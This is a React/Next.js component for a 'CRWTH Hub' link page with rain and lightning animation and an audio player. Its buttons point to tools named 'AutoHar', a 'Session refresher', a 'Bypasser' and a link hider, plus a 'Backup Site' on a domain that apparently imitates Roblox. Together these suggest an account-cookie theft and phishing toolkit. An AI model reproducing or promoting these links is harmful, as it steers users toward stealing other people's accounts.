"use client"

import { Button } from "@/components/ui/button"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Lock, Home, Shovel, Shield, Cookie, Paperclip, Volume2, VolumeX } from "lucide-react"
import { useEffect, useState, useRef } from "react"
import { ExternalLink } from "lucide-react"

export default function Component() {
  const redirectButtons = [
    {
      name: "Main Site",
      url: "https://app.genn.lu/auth/crwthgen",
      icon: Home,
      description: "Primary website",
      color:
        "bg-gray-800 hover:bg-blue-400 hover:shadow-lg hover:shadow-blue-300/40 text-white transition-all duration-300",
    },
    {
      name: "AutoHar",
      url: "https://bloxlab.st/create?ref=7c1QO5MMGQOpnkJGtfOghd3b1",
      icon: Shovel,
      description: "AutoHar tools",
      color:
        "bg-gray-800 hover:bg-blue-500 hover:shadow-lg hover:shadow-blue-300/40 text-white transition-all duration-300",
    },
    {
      name: "Backup Site",
      url: "https://ro.blox.pk/dashboard/?code=OTA2NzQwMTI4NjI5OTY5MTUw",
      icon: Shield,
      description: "Secondary site",
      color:
        "bg-gray-800 hover:bg-blue-600 hover:shadow-lg hover:shadow-blue-300/40 text-white transition-all duration-300",
    },
    {
      name: "HyperLink",
      url: "/hyperlink",
      icon: Paperclip,
      description: "Hide your Links",
      color:
        "bg-gray-800 hover:bg-blue-700 hover:shadow-lg hover:shadow-blue-300/40 text-white transition-all duration-300",
    },
    {
      name: "Refresher",
      url: "https://app.genn.lu/tools/refresher",
      icon: Cookie,
      description: "Session refresher",
      color:
        "bg-gray-800 hover:bg-blue-800 hover:shadow-lg hover:shadow-blue-300/40 text-white transition-all duration-300",
    },
    {
      name: "Bypasser",
      url: "/bypasser",
      icon: Lock,
      description: "access tools",
      color:
        "bg-gray-800 hover:bg-blue-900 hover:shadow-lg hover:shadow-blue-300/40 text-white transition-all duration-300",
    },
  ]

  const [isLightning, setIsLightning] = useState(false)
  const [volume, setVolume] = useState(0.2)
  const [isMuted, setIsMuted] = useState(false)
  const [showVolumeControl, setShowVolumeControl] = useState(false)
  const [isMobile, setIsMobile] = useState(false)
  const audioRef = useRef<HTMLAudioElement>(null)
  const hideTimeoutRef = useRef<NodeJS.Timeout | null>(null)
  const volumeControlRef = useRef<HTMLDivElement>(null)

  useEffect(() => {
    const checkMobile = () => {
      setIsMobile(window.innerWidth < 768)
    }

    checkMobile()
    window.addEventListener("resize", checkMobile)
    return () => window.removeEventListener("resize", checkMobile)
  }, [])

  useEffect(() => {
    const triggerLightning = () => {
      setIsLightning(true)
      setTimeout(() => setIsLightning(false), 150)
    }

    const lightningInterval = setInterval(() => {
      // Random chance for lightning (about every 3-8 seconds)
      if (Math.random() < 0.3) {
        triggerLightning()
        // Sometimes double flash
        if (Math.random() < 0.4) {
          setTimeout(triggerLightning, 300)
        }
      }
    }, 3000)

    return () => clearInterval(lightningInterval)
  }, [])

  useEffect(() => {
    if (audioRef.current) {
      audioRef.current.volume = isMuted ? 0 : volume
      audioRef.current.loop = true

      // Auto-play with user interaction fallback
      const playAudio = async () => {
        try {
          await audioRef.current?.play()
        } catch (error) {
          console.log("Auto-play prevented, waiting for user interaction")
        }
      }

      playAudio()
    }
  }, [volume, isMuted])

  // Click outside to close volume control
  useEffect(() => {
    const handleClickOutside = (event: MouseEvent | TouchEvent) => {
      if (volumeControlRef.current && !volumeControlRef.current.contains(event.target as Node)) {
        setShowVolumeControl(false)
      }
    }

    if (showVolumeControl) {
      document.addEventListener("mousedown", handleClickOutside)
      document.addEventListener("touchstart", handleClickOutside)
    }

    return () => {
      document.removeEventListener("mousedown", handleClickOutside)
      document.removeEventListener("touchstart", handleClickOutside)
    }
  }, [showVolumeControl])

  // Cleanup timeout on unmount
  useEffect(() => {
    return () => {
      if (hideTimeoutRef.current) {
        clearTimeout(hideTimeoutRef.current)
      }
    }
  }, [])

  const handleVolumeChange = (newVolume: number) => {
    // Ensure volume is between 0 and 1
    const clampedVolume = Math.max(0, Math.min(1, newVolume))
    setVolume(clampedVolume)
    setIsMuted(false)
  }

  const toggleMute = () => {
    setIsMuted(!isMuted)
  }

  const toggleVolumeControl = () => {
    setShowVolumeControl(!showVolumeControl)
  }

  const handleMouseEnter = () => {
    if (!isMobile) {
      // Clear any existing timeout
      if (hideTimeoutRef.current) {
        clearTimeout(hideTimeoutRef.current)
        hideTimeoutRef.current = null
      }
      setShowVolumeControl(true)
    }
  }

  const handleMouseLeave = () => {
    if (!isMobile) {
      // Set a 0.4-second delay before hiding
      hideTimeoutRef.current = setTimeout(() => {
        setShowVolumeControl(false)
        hideTimeoutRef.current = null
      }, 400)
    }
  }

  const handleRedirect = (url: string) => {
    if (url.startsWith("/")) {
      // Internal navigation
      window.location.href = url
    } else {
      // External navigation
      window.open(url, "_blank", "noopener,noreferrer")
    }
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-950 via-gray-900 to-gray-700 p-2 sm:p-4 flex items-center justify-center relative">
      {/* Audio Element */}
      <audio ref={audioRef} preload="auto">
        <source src="/here-i-am-doors.mp4" type="audio/mp4" />
        Your browser does not support the audio element.
      </audio>

      {/* Volume Control */}
      <div
        ref={volumeControlRef}
        className={`fixed ${isMobile ? "bottom-4 right-4" : "top-6 right-6"} z-20`}
        onMouseEnter={handleMouseEnter}
        onMouseLeave={handleMouseLeave}
      >
        <div className="relative">
          <Button
            onClick={isMobile ? toggleVolumeControl : toggleMute}
            className={`${isMobile ? "w-12 h-12" : "w-8 h-8"} bg-gray-800/80 hover:bg-gray-700/80 text-white border border-blue-800/50 backdrop-blur-sm transition-all duration-300`}
            size={isMobile ? "lg" : "sm"}
          >
            {isMuted ? (
              <VolumeX className={`${isMobile ? "w-6 h-6" : "w-4 h-4"}`} />
            ) : (
              <Volume2 className={`${isMobile ? "w-6 h-6" : "w-4 h-4"}`} />
            )}
          </Button>

          {/* Volume Control Panel */}
          <div
            className={`absolute ${isMobile ? "bottom-full right-0 mb-2" : "top-full right-0 mt-2"} bg-gray-900/95 border border-blue-800/50 rounded-lg p-4 backdrop-blur-sm transition-all duration-300 ${
              showVolumeControl ? "opacity-100 translate-y-0" : "opacity-0 -translate-y-2 pointer-events-none"
            }`}
            style={{ minWidth: isMobile ? "250px" : "200px" }}
            onMouseEnter={handleMouseEnter}
            onMouseLeave={handleMouseLeave}
          >
            <div className="space-y-4">
              <div className={`${isMobile ? "text-base" : "text-sm"} text-gray-300 font-medium`}>Volume Control</div>

              {/* Volume Slider */}
              <div className="space-y-3">
                <input
                  type="range"
                  min="0"
                  max="1"
                  step="0.05"
                  value={volume}
                  onChange={(e) => handleVolumeChange(Number.parseFloat(e.target.value))}
                  className={`w-full ${isMobile ? "h-3" : "h-2"} bg-gray-700 rounded-lg appearance-none cursor-pointer slider`}
                />
                <div className={`flex justify-between ${isMobile ? "text-sm" : "text-xs"} text-gray-400`}>
                  <span>0%</span>
                  <span className="text-cyan-400">{Math.round(volume * 100)}%</span>
                  <span>100%</span>
                </div>
              </div>

              {/* Mute Button */}
              <Button
                onClick={toggleMute}
                className={`w-full ${isMobile ? "py-3 text-base" : "py-2 text-sm"} transition-all duration-300 ${
                  isMuted ? "bg-red-800 hover:bg-red-700 text-white" : "bg-blue-800 hover:bg-blue-700 text-white"
                }`}
                size={isMobile ? "lg" : "sm"}
              >
                {isMuted ? "Unmute" : "Mute"}
              </Button>
            </div>
          </div>
        </div>
      </div>

      {/* Lightning Flash Overlay */}
      <div
        className={`fixed inset-0 pointer-events-none transition-opacity duration-150 ${
          isLightning ? "opacity-20" : "opacity-0"
        } bg-gradient-to-br from-cyan-200 via-white to-rose-200 z-10`}
      />
      {/* Rain Effect - Reduced on mobile for performance */}
      <div className="fixed inset-0 pointer-events-none overflow-hidden">
        {Array.from({ length: isMobile ? 25 : 50 }).map((_, i) => (
          <div
            key={i}
            className={`absolute w-0.5 bg-gradient-to-b rain-drop transition-colors duration-150 ${
              isLightning ? "from-cyan-100/60 to-transparent" : "from-cyan-400/30 to-transparent"
            }`}
            style={{
              left: `${Math.random() * 100}%`,
              height: `${Math.random() * 100 + 50}px`,
              animationDelay: `${Math.random() * 2}s`,
              animationDuration: `${Math.random() * 3 + 2}s`,
              transform: `translateY(-100px)`,
            }}
          />
        ))}
      </div>
      <style jsx>{`
        @keyframes rain {
          0% {
            transform: translateY(-100px);
            opacity: 0;
          }
          10% {
            opacity: 1;
          }
          90% {
            opacity: 1;
          }
          100% {
            transform: translateY(100vh);
            opacity: 0;
          }
        }
        .rain-drop {
          animation: rain linear infinite;
        }
        .slider::-webkit-slider-thumb {
          appearance: none;
          height: ${isMobile ? "20px" : "16px"};
          width: ${isMobile ? "20px" : "16px"};
          border-radius: 50%;
          background: #3b82f6;
          cursor: pointer;
          border: 2px solid #1e40af;
        }
        .slider::-moz-range-thumb {
          height: ${isMobile ? "20px" : "16px"};
          width: ${isMobile ? "20px" : "16px"};
          border-radius: 50%;
          background: #3b82f6;
          cursor: pointer;
          border: 2px solid #1e40af;
        }
      `}</style>
      <Card
        className={`w-full max-w-4xl shadow-2xl border-0 backdrop-blur-sm border transition-all duration-150 ${
          isLightning ? "bg-gray-800/95 border-cyan-300/30 shadow-cyan-500/20" : "bg-gray-900/90 border-rose-900/30"
        }`}
      >
        <CardHeader className={`text-center space-y-4 ${isMobile ? "pb-6" : "pb-8"}`}>
          <div
            className={`mx-auto ${isMobile ? "w-20 h-20" : "w-24 h-24"} rounded-full flex items-center justify-center overflow-hidden bg-black/40 backdrop-blur-sm border border-rose-800/50 shadow-lg shadow-rose-900/20`}
          >
            <img
              src="/crwth-logo.gif"
              alt="CRWTH Logo"
              className={`${isMobile ? "w-28 h-28" : "w-32 h-32"} object-cover`}
            />
          </div>
          <CardTitle
            className={`${isMobile ? "text-3xl" : "text-4xl"} font-bold bg-gradient-to-r from-cyan-400 to-rose-400 bg-clip-text text-transparent`}
          >
            CRWTH Hub
          </CardTitle>
          <CardDescription className={`${isMobile ? "text-base px-2" : "text-lg"} text-gray-300 max-w-2xl mx-auto`}>
            Explore my digital presence across various platforms. Click any button below to visit the respective site.
          </CardDescription>
        </CardHeader>

        <CardContent className="space-y-6">
          <div
            className={`grid grid-cols-1 ${isMobile ? "sm:grid-cols-2 gap-3" : "md:grid-cols-2 lg:grid-cols-3 gap-4"}`}
          >
            {redirectButtons.map((button, index) => {
              const IconComponent = button.icon
              return (
                <Button
                  key={index}
                  onClick={() => handleRedirect(button.url)}
                  className={`${button.color} h-auto ${isMobile ? "p-4" : "p-6"} flex flex-col items-center space-y-3 transform hover:scale-105 active:scale-95 group touch-manipulation`}
                  variant="default"
                >
                  <IconComponent
                    className={`${isMobile ? "w-6 h-6" : "w-8 h-8"} group-hover:scale-110 transition-transform duration-200`}
                  />
                  <div className="text-center">
                    <div className={`font-semibold ${isMobile ? "text-base" : "text-lg"}`}>{button.name}</div>
                    <div className={`${isMobile ? "text-xs" : "text-sm"} opacity-90 mt-1`}>{button.description}</div>
                  </div>
                  <ExternalLink
                    className={`${isMobile ? "w-3 h-3" : "w-4 h-4"} opacity-70 group-hover:opacity-100 transition-opacity duration-200`}
                  />
                </Button>
              )
            })}
          </div>

          <div className={`text-center ${isMobile ? "pt-4" : "pt-6"} border-t border-rose-900/30`}>
            <p className={`${isMobile ? "text-xs" : "text-sm"} text-gray-400`}>
              {"Click any button to be redirected to the respective platform"}
            </p>
          </div>
        </CardContent>
      </Card>
    </div>
  )
}
